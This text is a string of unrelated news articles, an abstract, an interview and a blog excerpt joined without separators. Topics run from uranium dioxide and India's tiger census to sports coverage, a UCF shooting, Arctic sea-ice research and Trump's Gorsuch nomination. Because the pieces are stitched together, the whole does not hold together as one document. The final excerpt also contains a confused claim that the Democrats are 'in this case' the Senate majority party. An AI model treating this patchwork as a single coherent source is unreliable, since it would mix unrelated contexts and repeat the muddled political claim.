UO2, also known as urania or uranous oxide, is an oxide of uranium, and is a black, radioactive, crystalline powder that naturally occurs in the mineral uraninite. It is used in nuclear fuel rods in nuclear reactors.
UO2 is used mainly as nuclear fuel, specifically as UO2 or as a mixture of UO2 and PuO2 (plutonium dioxide) called a mixed oxide (MOX fuel) for fuel rods in nuclear reactors.
Uranium dioxide is produced by reducing uranium trioxide with hydrogen.
This reaction plays an important part in the creation of nuclear fuel through nuclear reprocessing and uranium enrichment.
The first ceremonial kick of the World Cup game (Brazil 2014) may be made by a paralyzed teenager, who, flanked by the two contending soccer teams, will saunter onto the pitch clad in a robotic bodysuit.
Led by Miguel Nicolelis, the Walk Again Project is a nonprofit, international collaboration among the Duke University Center for Neuroengineering, the Technical University of Munich, the Swiss Federal Institute of Technology in Lausanne, the Edmond and Lily Safra International Institute of Neuroscience of Natal in Brazil, The University of California, Davis, The University of Kentucky, and Regis Kopper of The Duke immersive Virtual Environment.
This started with research from the Nicolelis lab using hair-thin and flexible sensors, known as microwires, that have been implanted into the brains of rats & monkeys. These flexible electrical prongs can detect minute electrical signals, or action potentials, generated by hundreds of individual neurons distributed throughout the animals' frontal and parietal cortices—the regions that define a vast brain circuit responsible for the generation of voluntary movements.
Now, with further advancements, the candidate teenage kicker will be trained in Virtual Reality to control technology that will eventually allow them to kick the ball at the world cup. They will do this by wearing a non-invasive headpiece that detects brain waves.

A recurring theme in sociological research is the tradeoff between fitting in and standing out. Prior work examining this tension has tended to take either a network structural or a cultural perspective. We instead fuse these two traditions to develop a theory of how structural and cultural embeddedness jointly relate to individual attainment within organizations. Given that organizational culture is hard to observe, we develop a novel approach to assessing individuals' cultural fit with their colleagues in an organization based on the language expressed in internal email communications. Drawing on a unique data set that includes a corpus of 10.25 million email messages exchanged over five years among 601 employees in a high-technology firm, we find that network constraint impedes, while cultural fit promotes, individual attainment. More importantly, we find evidence of a tradeoff between the two forms of embeddedness: cultural fit benefits individuals with low network constraint (i.e., brokers), while network constraint promotes attainment for those with low cultural fit.

ARKANSAS (KFSM) -Hours after news broke that a national atheist organization had put up a billboard in Springdale, church leaders said they would put up their own billboard nearby to compete with the atheist message.
The group American Atheists said they have put up a billboard in Springdale that depicts a little girl writing to Santa saying that all she wants for Christmas is to skip church because she's too old for fairy tales. The billboard is part of a "firebrand-style" campaign launched in multiple Bible Belt cities including Memphis, Nashville, St. Louis and Fort Smith, according to a post on the American Atheists website. The group also plans to put up a billboard in Milwaukee.
Danielle Muscato, public relations director for American Atheists, told 5NEWS the billboards are aimed at in-the-closet atheists who are pressured to observe religious traditions during the holidays. He said the billboards are to let them know it is OK to doubt the way they were raised and think for themselves.
Leaders of Grace Church in Alma said they plan on putting up a billboard near the atheist advertisement, saying, "Questions, Doubts and Curiosity...All Welcome At Grace Church."
Muscato said he welcomes the church's billboard, saying he advocates people being able to think for themselves on whether to believe in any, or no, religion.
A statement from American Atheists initially said the billboard was in Fort Smith. However, the billboard actually stands just off of Interstate 49 in Springdale, north of Wagon Wheel Road.
The atheist billboard also advertises the annual American Atheists National Convention in Memphis scheduled for April of 2015, according to a post on the organization's website.
“Even children know churches spew absurdity, which is why they don't want to attend services. Enjoy the time with your family and friends instead,” said American Atheists President David Silverman. “Today's adults have no obligation to pretend to believe the lies their parents believed. It's OK to admit that your parents were wrong about God, and it's definitely OK to tell your children the truth.”
The group was unsuccessful in one Bible Belt city, though. American Atheists was unable to get their billboard put up in Jackson, Miss. due to push back against the billboard's content from local residents, according to the post.
"Area lessors rejected the design due to content," the post states.
Muscato said in the website post, “The fact that billboard companies would turn away business because they are so concerned about the reaction by the community to a simple message that not everyone goes to church and not everyone believes in gods shows just how much education and activism on behalf of atheists is needed in the South.”
The billboards will remain on display from Dec. 1 until Dec. 24, according to the post.
Loitering in South Dallas has gotten out of hand, according to one city leader. Councilman Kevin Felder is calling on the Dallas Police Department to fix it. (Published Tuesday, Aug. 15, 2017)
Loitering in South Dallas has gotten out of hand, according to one city leader. Councilman Kevin Felder is calling on the Dallas Police Department to fix it.
Felder's district encompasses much of the Fair Park neighborhood where he says the problem persists. He says loitering is a problem all along Martin Luther King Jr. Boulevard from Fair Park well beyond Interstate 45.
Business owners are also expressing concern.
Paulette Johnson shook her head as she explained the loitering problem outside her south-side restaurant, Trucker's Cafe, along MLK Jr. and how she tries to fight it.
Developing Judge Issues Arrest Warrant for Dallas City Councilman
"I just tell them they can't stand in front of this business like that. It's a place of business. Either you pay rent here or I pay rent. It's just we both can't be here," Johnson said.
She says despite her asking them the leave, the loiterers still linger. Johnson says it's a problem that stretches throughout neighboring south-side streets. Loitering just seems like a way of life in South Dallas, she says.
But not if Felder has anything to do with it. He says he's tired of the crime associated with loitering.
"There's loud music, there's drinking, there's drug abuse, marijuana smoking, just all sorts of things and some prostitution," Felder said.
He says it's happening right out in the open and laments nothing is being done about it.
Felder is not only asking the police department to strengthen the ordinance, but he is also in talks with the city's legal team.
"That's great. I mean, it should have been done a long time ago, so whatever he can do to help the south here, I mean, I think it's great," Johnson said.
Felder blames the problem on a lack of opportunity for citizens and says he's also devising a plan to bring more businesses and job opportunities to South Dallas.
The Dallas Police Department did not respond to NBC 5's request for comment on the matter.
According to the city attorney's office, a person could face a misdemeanor charge and a fine of up to $500 for loitering.
While some top NFL draft prospects have announced they are going to play in their teams' bowl games, many others are choosing to sit out to avoid injury. However, UCLA quarterback Josh Rosen has now said that won't be him. Rosen's availability for Tuesday's Cactus Bowl game against Kansas State is up in the air, as he's still recovering from a concussion sustained in the Bruins' Nov. 24 season finale against Cal (the second concussion he's suffered this season), and Tracy Pierson of 247Sports' Bruin Report Online wrote Saturday morning that Rosen “will not play in the Cactus Bowl Tuesday, according to sources.” However, Rosen told Norm Frauenheim of the Los Angeles Times Saturday afternoon that he plans to play if UCLA's doctors clear him:
Josh Rosen, who doesn't know whether doctors will clear him to play in the Cactus Bowl and isn't certain if he'll return to UCLA or enter the NFL Draft, is sure of one thing. At least, he was Saturday. He says he'll be at quarterback for the Bruins against Kansas State on Tuesday night at Chase Field if he gets the medical OK. “Absolutely,” Rosen said. “I'm here.” …”Get checked every morning,” said Rosen, who said he saw doctors Saturday when the Bruins practiced at a high school in Gilbert, a Phoenix suburb. When asked if the latest diagnosis was optimistic, Rosen couldn't be sure. “I don't know,” he said of a decision that might not be made until game time. “I'm not into inferring. But we'll see.”
Playing in the bowl game if cleared is an interesting move for Rosen, and one that could pay off big or backfire spectacularly. Rosen, a junior, hasn't declared for the NFL draft yet, but if he goes that route, many have projected him as a possible first overall pick already. Thus, he definitely has a lot to lose if he delivers a bad performance or, worse still, suffers a serious injury. However, he could have some things to gain as well.
For one, if Rosen was healthy but opted to sit out, some NFL teams might consider that a mark against him. For another, there's the competition to think of; Wyoming's Josh Allen, another much-discussed junior quarterback prospect, was impressive in the Cowboys' 37-14 Famous Potato Bowl win over Central Michigan Friday, completing 11 of 19 passes for 154 yards and three touchdowns (including 104 yards and three TDs in the first quarter while the game was still in question) and declaring for the draft afterwards. And USC sophomore Sam Darnold, another top quarterback prospect, is expected to play in the Cotton Bowl against Ohio State. So it might not be great for Rosen if those other two prospects have good games and he doesn't play. Yes, there's a whole body of work to consider, but recent games often stick in the minds of evaluators. And beyond that, a great game from Rosen might elevate his stock further and make him even more of an obvious high pick.
There are still a few days to go before the game, and it sounds like the decision on whether to clear Rosen or not may come close to game time. So we'll have to wait and see if he actually plays. But it's interesting to hear him saying on the record that he'll play if he is cleared. It's a decision that certainly carries some risk, but it could have upside as well.
Update: Sports Illustrated‘s Bruce Feldman is reporting that the doctors won't clear Rosen according to sources, which would make his decision moot. But it's still interesting that Rosen wanted to play in this one despite his already-lofty draft status.

This will be Don Orsillo's last season as play-by-play announcer for the Boston Red Sox TV broadcast on NESN, WEEI's Gerry Callahan reported during this morning's "Dennis & Callahan Morning Show."
This will be Don Orsillo's final season on the Red Sox broadcast according to multiple sources. — Dennis and Callahan (@DandCShow) August 25, 2015
The report comes as a shock to cap off a roller coaster season for the Red Sox, which has showcased a bizarre onfield product as well as some major upheaval in the front office. Seeing the craziness of the season extend to the broadcast booth, though, was not expected.
Here's what Callahan said on WEEI this morning:
"I don't even know if I'm breaking it. [Glenn] Ordway said this a month ago on the air, said that there were big changes coming to NESN, and now we're hearing, the rumblings are loud and clear now that -- and I don't get it -- and I was going to ask you guys if you felt that there was a need for a change. They are moving on from Don Orsillo."
Orsillo, who's worked Red Sox games for NESN since 2001 and has previously called Springfield Falcons games, is part of the network's popular broadcast duo alongside color commentator Jerry Remy. The duo is known for the tendency to crack up during otherwise dull games, but are considered to be one of the more popular TV teams in New England Sports.
Neither NESN nor the Boston Red Sox have confirmed the move.

India says it now has almost a third more tigers than it did four years ago.
Presenting the findings of the latest tiger census, Environment Minister Prakash Javadekar said the tiger population had risen from 1,706 in 2011 to 2,226 in 2014.
He said a number of government initiatives to streamline tiger conservation were behind the increase.
India is estimated to be home to around 70% of the world's tigers.
Mr Javadekar described the results of the census as a "huge success story".
'Great news'
"Never before has such an exercise been taken on such a massive scale where we have unique photographs of 80% of India's tigers," he told journalists in Delhi.
"While the tiger population is falling in the world, it is rising in India. This is great news," he added.
Tiger conservation practices that had proved successful in India could be adopted elsewhere, he suggested.
He also said India was willing to donate tiger cubs to the international community and play a key role in global tiger conservation.
Wildlife campaigners had been expressing concerns over dwindling numbers of tigers for some time.
The Times of India say that as recently as 2008, census figures showed a tiger population of just 1,411.
Earlier this year, the future of Mono, the open-source implementation of Microsoft's .NET (s MSFT) development framework, was up in the air. On May 4, 2011, Novell conducted a large round of layoffs as part of its post-merger with Attachmate — and one of the casualties was the 30-person team that worked on Mono.
But Mono's Founder and Lead Developer Miguel de Icaza was not about to let that be the end of the road. Fewer than two weeks after Novell swung the axe, de Icaza announced the launch of Xamarin, a startup calling itself “the new home of the engineers that created Mono” with a strong focus on mobile products. It was inspiring news, but it was clear Xamarin had its work cut out for it: Moving an open-source project like Mono away from the cushy corporate parent company in which it lived for nearly eight years would not be a walk in the park.

The challenge was big, but today, Xamarin is going strong: The company is generating self-sustaining revenue and is on a steady product launch schedule. (Last week it rolled out Mono for Android 4.0, which lets developers make apps that work with the latest version of Android, Ice Cream Sandwich.) We caught up with Miguel de Icaza, who serves as Xamarin's CTO, a few days ago to get a few more details on how things have been going since he and his team decided to go it alone.
A wild summer leads to a profitable fall
“It was a wild summer,” de Icaza said. Back when Xamarin was born in mid-May, the team had to kick into overdrive to make sure it could get off the ground as an independent company. “After the Novell layoffs, one option would be for everyone to go home and just find a different job. But we love this project, and we love what we're doing,” he said.
That early hustle soon brought results. Xamarin landed a couple of large clients, which allowed the company to hire all the people who had been laid off from the Mono team at Novell. Then in July, Xamarin inked a partnership with SUSE (the Attachmate business unit that now houses all the old Novell assets) to obtain all the rights to Mono. In exchange, Xamarin agreed to provide support for all of the old Mono customers. “We got ten years' worth of intellectual property, and Novell got all its customers taken care of,” de Icaza said.
Funding is no longer a must-have
As a result of garnering the rights to Mono and a solid customer base, Xamarin wound up with self-sustaining revenue that covers its staff of some 50 people — without having taken on any venture capital. According to de Icaza, Xamarin may still take on outside investors, but it's not a must:
“During week one of the layoff [taking funding] was the only option on the table. Now we have a product that brings self-sustaining revenue. Taking on outside money is still a discussion we can have, and it's something we'll consider, but it's not a pressing issue.”
The new year and beyond
Xamarin has no plans to start resting on its laurels; according to de Icaza, the company has plans to be busy for many months ahead. “We want to make it easier for people to share code between Windows, iPhone (s aapl) and Android, (s goog) and we believe we can make this the one language that can do that. We want to make people incredibly productive with our stack for mobile development,” he said. “All these people trusted that we could deliver these tools, now we need to keep making the product better.”
0 Cellphone video shows gunman open fire in fatal shooting near UCF
ORANGE COUNTY, Fla. - Stunning new cellphone video could help authorities identify a suspect in connection with a shooting this weekend at an apartment complex near the University of Central Florida.
The video was taken early Saturday morning at the Gatherings apartments along Gathering Drive near University Boulevard, authorities said.
Investigators believe a passenger hanging out of a pickup truck and opening fire was the same man who shot and killed 24-year-old Brandon Benjamin, following an argument at the end of a party.
A person who intended to record the block party at the Gatherings ended up documenting moments that could help investigators solve the murder.
The cellphone video captured gunfire ringing out Saturday morning.
The person recording the video drops his phone in a panic.
Moments later, there are more shots.
The gunfire killed the 24-year-old Full Sail student.
Benjamin was left to die in the road.
Authorities believe he was just an innocent bystander.
"This is just a terrible, terrible thing that has happened to this young man who was doing nothing more than attending a party," said Jane Watrel, of the Orange County Sheriff's Office. "We need to find out who did this to him and this video is just a key piece of evidence."
According to investigators, a group of people was leaving a party when an argument broke out and shots were fired. Investigators have not said what the argument was about.
The pickup truck involved in the shooting is described as light-colored and "rough-looking" with rust on the body.
Also in the video, a red Honda Civic can be seen driving away. Authorities are also looking for the driver of that vehicle.
WFTV learned Benjamin was a recording arts student at Full Sail. Benjamin came to Orlando from North Carolina.
In a makeshift memorial, his friends laid flowers and candles at the spot where he was killed.

A spectacular photo taken in Pangnirtung, Nunavut, is generating a lot of attention on social media.
The photo shows local resident Markus Siivola throwing hot tea into the air as he bends backwards. In the –40 C weather, the tea freezes as soon as it's tossed.
Photographer Michael H. Davies said the whole photo shoot was planned after he saw a similar photo elsewhere and decided he could top it.
Michael Davies didn't think much of his picture that turned to gold on the internet until the numbers convinced him otherwise 5:59
"I went through the science of it," he said. "I figured, 'OK, I need 40 below, I need calm winds, I need the sunset in the background so it lights up my fog when I film it.'"
Davies and Siivola travelled by snowmobile into the mountains about 45 minutes out of town.
It was a race against time to catch the setting sun. The community, which is only a few kilometres below the Arctic Circle, gets about 2½ hours of sun this time of year.
They were carrying five or six thermoses of hot water, each with different amounts so they could experiment to get the right shot.
"In each one we threw in a tea bag because we thought, if this doesn't work, at least we can have a tea, because, as everybody knows, in Nunavut we go to great lengths to have tea somewhere strange, whether it's in front of an iceberg, or on top of a mountain or in the middle of the tundra."
The second shot proved to be internet gold, though Davies admits it wasn't his first pick.
From Pontypool to Pangnirtung
Davies, originally from Pontypool, Ont., is a trained painter, photographer and glass blower. He has lived in Pangnirtung for about 10 years with his wife and, now, two young children.
"We just kind of randomly decided, 'Let's go somewhere that nobody goes but everybody talks about.'"
For Davies, Pangnirtung is now home, but he admits the family doesn't usually stay for Christmas.
This year, however, he says it would have cost $8,000 to take his family to Ontario, so they decided against it. Instead, they stayed put, and he took the photograph the next day.
"Obviously if we had gone south, it wouldn't have happened."
Since posting the photo on Facebook, he has had inquiries from around the world.
"After we threw the tea, there was like a puffy cloud that would float away. It was like we made our own cloud that would gently float down the mountainside."
My trip to the NFL owners meetings last month included a chance encounter with an NFL executive. We discussed the state of what has become a highly competitive and interesting division from a league perspective, given the Green Bay Packers' recent success, the Detroit Lions' explosive offense and the Chicago Bears' flurry of offseason improvements.
And then we got to the Minnesota Vikings.
"Big year for Leslie Frazier," the executive said. "Big year."
That perspective caught me by surprise, given that Frazier has spent exactly one full season as the Vikings' permanent head coach. But Frazier is also entering what reportedly is the final fully guaranteed year of his contract, and the long-term approach the Vikings have taken toward building their roster provides a substantial challenge to a coach with limited job security.
That's a nice way of saying Frazier probably needs to do a lot better in 2012 than the 3-13 record he produced last year, but with a roster that won't be constructed to support a quick turnaround. It's an unfortunate collection of circumstances that Frazier is only partially to blame for, but when viewed in the big picture, you can understand why the executive sees 2012 as a pressure point for his career.
(My friend Judd Zulgad of 1500ESPN.com made a similar point last week.)
When the Vikings promoted Rick Spielman to general manager in January, Frazier said the move "should help me tremendously." Generally speaking, working for a good general manager is a healthy situation for any coach.
But since that point, the Vikings have dismantled their offensive line by releasing both starting guards and making plans to shift left tackle Charlie Johnson inside. They've given young quarterback Christian Ponder one more established playmaker, tight end John Carlson, but otherwise left their offensive skill positions untouched in free agency. They've bid farewell to their nose tackle and middle linebacker, tapping longtime backups as the likely successor in each role, and left untouched two safety positions that ended 2011 in shambles.
Spielman has made no secret of his intention: To get younger, to find blue-chip players in the draft and to supplement with complementary players in free agency. That's a sound philosophy for building long-term success, but it sure doesn't work in favor of a coach whose career record is now 6-16.
Take a look at the chart. A little more than half of the NFL's coaches (18 of 32) have reached a third full season in their jobs. Only four of them made it without the benefit of at least one non-losing season in their first two. And the only two who didn't demonstrate progress were the Washington Redskins' Mike Shanahan and the Seattle Seahawks' Pete Carroll, both of whom carried enough celebrity status -- and not to mention huge financial investments -- to be all but assured of a third season from the moment they arrived.
But consider the Vikings' placement in the NFC North, which put three teams among the top 10 in ESPN.com's the most recent Power Rankings. Remember that they will be starting Ponder, who is in the midst of his first NFL offseason. Ponder will play behind a rebuilt offensive line, with a set of receivers who will either be underwhelming or inexperienced or both.
In a best-case scenario, tailback Adrian Peterson (knee) will resume football activities shortly before the season begins. And in a division that includes star quarterbacks Aaron Rodgers, Matthew Stafford and Jay Cutler, it's worth noting the Vikings' historically poor pass defense hasn't been enhanced this offseason with a single defensive back who could be considered a starter. (Perhaps that sentence will need editing after the draft.)
Does that seem like a collection of circumstances favorable to a coach demonstrating significant progress in 2012? Not particularly, no.
To be clear, I don't think the Vikings are in an inappropriate spot as a franchise. This has been coming since the moment they failed to reach the Super Bowl in 2009. It's just poor timing for Frazier.
The best time to make these kinds of difficult decisions is in the first year of a coach's tenure. You take the resulting lumps when your job is most secure, and then presumably demonstrate steady progress thereafter. The Vikings lost 13 of 16 games last season in a misguided attempt to push an aging roster toward one final playoff berth. It was a lost year in every way, and only now do they face the proverbial bottoming-out. I don't want to say Leslie Frazier is set up to fail, but the deck seems stacked against him.

“I'm predominantly an abstract urban landscape photographer and sideline street photographer and am I wondering if theres anything interesting on my website that you guys would like to feature.” says photographer Ed Fetahovic in an email to the Phoblographer.
Ed describes his approach to the medium as one of modernist art. He doesn't only shoot black and white, but some of his strongest work is monochrome. If you consider his thought process, it makes sense. “I think people interact with geometric shapes and negative spaces on a deep and ethereal space beyond their conscious limitation which pushes me to bring more and more abstract urbanist photos to view.” says Ed about his work.
For Ed, photography is an artistic release.
Phoblographer: Talk to us about how you got into photography.
Ed: I spent a little bit of time prior to discovering photography looking for an artistic release. I tried a variety of different fields like many do, I dabbled mainly in trying to become a guitarist and a writer but found whatever was crammed into my head wasn't being expressed. My ideas and thoughts were too visual and none of the other mediums I used to try and explain it seemed to get rid of the constant nagging of visual ideas.
Photography never really seemed to appear as an option for me, I always thought painting would have to suffice but the learning curve was so steep and whilst always being someone who appreciated a canvas painting, the competition to get noticed in that space was not just a very difficult medium, but it existed in a world now moving to the digital space which had me quite disinterested. So the frustration of not being able to express the weird and wonderful ideas visual present just built up in the background for a few years until my mum tell's me one day that my dad had taken up photography.
I was curious about it at that point but my perception of the medium was somewhat ignorant. I didn't know enough about the medium to know about some of the most prolific works of art by artists that I now adore. I inquired about why he took it up and his response is what had me intrigued. It seemed to have changed his point of view on a lot of things to a deeper and more fascinated notion. I noticed he became happier and also that he began to interact with things he would otherwise probably leave unnoticed – that's what initially drew me to photography.
The realization that even though a lot of people spend time staring at their digital images is that it's their way of experiencing the world and sharing it with ease.
I think memes are the perfect example – ever come across a meme that literally explains how you've felt in a certain situation? Well now you can relate better to the millions of other people who've seen that meme and actively use it in response to something so as to express themselves. That was my first mental and somewhat philosophical introduction to photography.
Phoblographer: What made you get into street photography and urban geometry?
Ed: I dabbled in a lot of different styles. When I started out I thought I was going to be a landscape photographer because I spent a lot of time taking photos of landscapes. I even won a local competition with one of my landscape photos which landed me some professional studio lights. I think the extra equipment I got from that win however was what made me realise that photography was more and more about decisive moments than walking around at random trying to take enough photos in the hopes that one of them will be a stunner. I was still new to photography when I had this process of thought.
My partner luckily introduced the concept of researching art outside of the photographic medium and even just looking into the history of photography as inspiration to direct me to compose and develop my own voice and style. I found a world of art I had no idea was even there. I feel in love with Ansel Adams black and white landscapes which always spoke to me like charcoal landscape drawings, however I looked to Vermeer to start learning about lighting and contrast and scene setting,
I looked to the street photographers such as Moriyama, Erwitt, Powell and Meowitz to name a few to learn about deceive moments and depth of interaction and from there I started to look at anything that would allow me to pull the visuals out of my head and onto the screen (too many to mention). The names I mentioned were heavily influential in me beginning to orchestrate my currently emerging style. I fell instantly in love with their raw ability to show all these different aspects of our daily life that you otherwise wouldn't notice. When I noticed that about their work; street photography was a given from that point onward. I think the biggest pull to the style was in realising and understating how it was thought of, sought after and what it meant. I think the raw moments captured gives us insight into life, how it behaves and thus delving into your own reality and trying to discover who you are. I don't think there is a more beautiful concept in life than that one right there.
The urban landscapes came about very recently when I noticed that I had an affinity to the shapes and moments created in abstract by the purposeful but extremely random assortment of building and their decaying architecture. So now – I try and element and feature both in my visions and ideas. My voice is still developing and I still have a lot to learn but as Elliott Erwitt says “If I couldn't take a perfect picture I wouldn't be a photographer”.
Phoblographer: Your work is extremely high contrast stuff that if blurred or converted into some sort of charcoal etching would be just about the shapes. So how does your mind's eye go about composing scenes, figuring out exposures, and adhering to your creative vision?
Ed: I think I've always been someone interested in the abstract moment. I spent a lot of time reading and writing about philosophy because that's how my mind seemed to always be – I would always visualise strange and interesting moments but always struggled to explain it to people verbally. To compose my moments fundamental lines and shapes are critical for me to even consider taking the photo. Lighting comes into play a lot but I'm highly attracted to negative space and minimalism as well. I've noticed recently that I like diagonal lines that turn into triangles and effectively shapes that are somewhat not their total shape. So a bent triangle for example. Normally to get these types of shadows, lines and shapes mid day is the best time to walk through the city – I find the sharpest and cleanest lines appear at that time too – so I'm usually out taking photos at what is probably considered the worst time to take photos by many photographers.
My shutter speed sits between 250-600 depending on whether there is shade or not, my iso sits at 100 and never changes unless I'm in a tunnel or underground parking of some sort and I try and keep my aperture constantly at f/8. I normally just change the shutter speed depending on the light available – but I also like to mess around with the available light and the cameras response to it. I find negative space can easily be made with over exposure if there is a dark enough scene available to contrast the over exposure. Given I'm still new to photography, I'm still learning and playing around with the settings however!
Phoblographer: You've had your work featured in a big newspaper, but what is it like for you trying to shop this work around into galleries and other places?
Ed: So far – the only success at being featured in galleries I've had been the ones I've won some form of competition in. I'm still working on refining my artistic style prior to approaching any art collectives and galleries as the critiques I've had thus far is that my style needs to be more developed. Hopefully in the near future maybe one (a few?) of my prints will be up on the wall of a gallery somewhere. I would absolutely love that! That being said I have sold some prints to some local friends and followers and am continually surprised when I get compliments from peers regarding the progression of my work.
Phoblographer: What motivates you to shoot a specific scene? The lighting? The shadows?
Ed: The scene has to be about the moment. Usually I wonder if people have noticed an interesting wall or how often someone might even see the contrast between the red of a fire hydrant booster and they grey of the wall behind it colour blocking each other. I know of a few places in the city were by around mid day the red of the fire booster will splash onto the grey of the wall and for the first time in 24 hours those two non connected inanimate objects actually interact – which to me is fascinating and awesome. So usually I firstly wonder if people have ever noticed something – and then I think about how I can get them to notice it if I think it's worth highlighting (as in what features are drawing me in)- from there it's taking into account the line that the shadows make, the negative space I can manipulate, the harshness of the light available or lack their of, the colours or lack there of and how abstract it seems to me.
If my gut starts to twist I know I've found a moment I'm in love with so that will usually be the critical mass moment causing me to hit the button several times to find the right composure. I wont stick around for any longer than 30 seconds however, hence me mentioning the moment earlier. When I do photo walks – my technique is to survey things from afar then from in close – if nether catch my attention I keep walking until something does.
Phoblographer: Talk to us about the gear that you use.
Ed: I started out with a Nikon D5100 and predominantly used a 28-105mm macro lens my partner gifted to me. I did most of my natural landscape work with the 28-105mm and I loved (still do) that lens – however I challenged myself one day to try a different lens and outside of the generic 18-55mm and 55mm-300mm lenses that you get stock standard with the D5100. When I bought the D5100 my dad gave me a 35mm prime he never used alongside the other lenses I mentioned. I decided to try it out on the street one day given 35mm was the standard lens on a film camera used for street photography back in the day.
I haven't stopped using the 35mm since (around 3 months now). I upgraded my camera however whilst I was traveling in Japan to a D7200 and so my combination of equipment is as such. I bought the D7200 because I was worried the D5100 was getting a little old. It was a 4th hand camera at that point.
Phoblographer: What direction are you trying to take your work in and how do you want it to progress?
Ed: I want to progress my photography to a point where I can show the delicacies of my ideas in galleries. It's a tough aim but I hope to be able to show that many of our day-to-day habits have left even the most interesting areas of our cities and urban areas unseen and neglected. I think part of the reason why abstract, and cubist and modern art existed was for a similar reason. We spent so much time focusing on the beauty of pretty and “perfect” that we forgot to realise that we are indeed also the very opposite of that. I think I'll be continuing to refine the path I'm on where geometric moments come into play with raw street photography – but I do like the two mediums on their own also and will continue pursuing each on their own as well.
I will also continue discovering both colour and black and white photography and hopefully one day my vision and interests will be viewed by a wider community as an expression of continual search for meaning of the moments behind the scenes.
Ivan Semeniuk, The Globe's science reporter, is aboard the Amundsen on a weeks-long scientific journey to explore the impact of the warming climate and northern development on the ocean.
When Arctic sea ice makes the news, the focus is inevitably on quantity.
The amount of ice on the ocean in summer is shrinking by 14 per cent a decade, a well-documented effect of climate change. The prospect of a largely ice-free Arctic by mid-century, the impact that will have on the northern environment and its potential effects on weather patterns in much of North America and Eurasia, have raised the profile of sea ice to iconic status in the continuing debate over how the human causes of climate change should be addressed.

But for those who study sea ice, what matters most day-to-day is quality rather than quantity.
Sea ice is a wonderfully complex and sometimes frightening material that comes in many forms – several of which could be observed directly from the Amundsen, a Canadian Coast Guard ship that is the country's premier platform for ice research.
For example, there is "grease ice," a thin layer of newly forming ice that rides atop the ocean swells like an oil slick. There is also multiyear ice, cyan-coloured chunks that have survived many seasons without melting, their vivid hue a function of the way light interacts with the long-frozen ice crystals within.
But for Lauren Candlish, a research associate with the University of Manitoba, the problem on this voyage has been too much "rotten ice."
Her goal, and that of her colleagues, is to deploy a series of remote stations that will radio back data and allow researchers to track selected ice floes on the Beaufort Sea and monitor atmospheric conditions there. The data will help scientists better understand – and hopefully predict – the behaviour of ice in an increasingly unpredictable setting.
But rotten ice is not what Ms. Candlish needs. Like Swiss cheese, it is full of holes, which can easily be seen from the Amundsen's helicopter.
As ice floes warm in the summer, bright blue ponds of melt water appear on their surfaces. When the ice is rotten, the ponds look black.

"That means they've melted right through," Ms. Candlish said. Such ice is thin enough to break up and melt away or be crushed by collisions with denser chunks of ice – either of which would destroy a station.
During the Amundsen's tour of the Beaufort this month, the challenge of finding good ice has been compounded by foggy conditions that have often kept the helicopter in its hangar on the aft deck. But on Monday the ship encountered a suitable floe of thick ice, and six of us climbed into "the cage" and were lowered directly onto it by one of the ship's cranes.
Studying the properties of Arctic sea ice is a key part of the science that takes place aboard the Amundsen. It is also the riskiest.
This was tragically demonstrated last year when the ship's helicopter crashed into the icy waters of M'Clure Strait claiming the lives of pilot Daniel Dubé, scientist Klaus Hochheim, and the Amundsen's commanding officer, Marc Thibault.
The crash occurred several kilometres from the ship and all three died of exposure in the water before they were found. The incident stunned the close-knit community of researchers and crew members who work on the Amundsen and the seamen who found themselves retrieving the bodies of their friends and co-workers.
A final report from the Transportation Safety Board is still pending, but some of the effects of the accident are apparent in the heightened caution with which ice work is handled on the ship.

At the time of the accident, the helicopter had a cone-shaped device mounted on its front that uses an electromagnetic field to measure ice thickness. The method requires flying low over the ice, which means there is little time for a pilot to react when something goes wrong. The device is no longer used.
Preliminary findings from the accident suggest the victims were either not wearing the right kind of protective gear or not wearing it properly. Now, everyone who flies in the Amundsen's helicopter – which is the only way of boarding and leaving the ship when it is stationed in the North – wears an immersion suit at all times.
The suit is a newer model than those used in previous years, with elastic cuffs and collar – designed to prevent water seeping in – that cannot be loosened. Those who use the helicopter as part of science work on the ice must now take an additional survival course that includes a staged immersion in a cold tank.
Yet even under the best circumstances, researchers know that survival in Arctic waters comes down to a matter of minutes, not hours.
"It's in the back of your mind – something you always think about," said David Babb, also with the University of Manitoba.
As we trudged carefully across the ice this week, we were also alert to another danger – polar bears. For that reason, research teams are accompanied by crew members armed with rifles when working on sea ice.

While caution about ice work remains at a high level, the research has not stopped. Balanced against the risk is the need for detailed information on the changing behaviour of sea ice, which poses a growing hazard for northern navigation because decreasing ice overall means more ice on the move.
"Yes, there is less ice in the summer – but the ice that is present is quite dangerous," said Matt Arkett, who manages the remote sensing group at the Canadian Ice Service in Ottawa and who accompanied the Manitoba team on this outing.
Mr. Arkett said that while ice monitoring from orbiting satellites, particularly by Canada's Radarsat series, has revolutionized the field, satellite data must still be validated with direct observation on the ice so it can be interpreted correctly.
The stations are assembled in less than two hours. By the end of Monday, two were erected on two separate ice floes, making a total of five deployed from the Amundsen this summer. The stations are solar-powered with batteries design to survive the long, dark Arctic winter.
"About a year is what we're hoping from them," Ms. Candlish said.
Although data from the stations will be publicly available, part of the cost of the project is covered by Exxon-Mobil – a reflection of the oil industry's need to better understand ice hazards as companies increasingly look to develop reserves in the Beaufort.

There is an obvious irony in this, since the use of fossil fuels is ultimately the driving force behind the vast transformations in the Arctic. But this does not alter the inescapable fact that whether or not Arctic oil development proceeds, change is already under way and information is needed.
"Simply put, if activity in the Arctic increases, then the risk of incidents related to ice hazards will rise for the foreseeable future," said Derek Mueller, an assistant professor at Carleton University whose work on the Amundsen is related to large ice islands that have recently been observed breaking away from Canada's northern archipelago.
As those on the Amundsen can attest, ice remains the defining feature of Canada's Arctic waters. And while its quantity may be diminishing, its relevance seems only to grow.

From Zero Hedge:
Donald Trump has made his first comments since nominating Judge Gorsuch for The Supreme Court, stating that “I don't know how anyone can oppose Gorsuch” warning that if Congress ends up in gridlock, he would tell Majority leader Mitch McConnell to “go nuclear” – referring to a rule change enabling a simple majority to confirm his picks. As a reminder, the “nuclear option” refers to a move by the majority party in Senate — in this case the Democrats — to change the Senate rules to allow most executive branch and judicial nominations to be approved with a simple majority – 51 votes — rather than the 60 votes now required. Under longstanding rules, the minority party has been able to block a nomination with just 41 votes, commonly called a filibuster.

Do it if you have to and don't hold back. Democrats initiated the nuclear option thinking they were going to be in control for 100 years. Well, America didn't think so when they fixed this ship.

